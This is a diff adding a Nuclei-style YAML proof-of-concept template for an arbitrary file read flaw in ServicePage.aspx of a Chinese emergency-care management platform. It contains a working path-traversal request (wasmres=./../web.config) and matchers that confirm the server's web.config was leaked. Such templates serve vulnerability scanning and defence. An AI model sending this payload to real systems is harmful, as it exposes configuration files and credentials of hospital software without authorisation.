@@ -1,0 +1,25 @@
+id: poc-yaml-ecmp-servicepage-aspx-anyfile-read
+info:
+  name: 急诊综合管理平台 ServicePage.aspx 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/dcwriter/thirdpart/ServicePage.aspx?wasmres=./../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+          - "</system.web>"
+          - "<webServices>"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
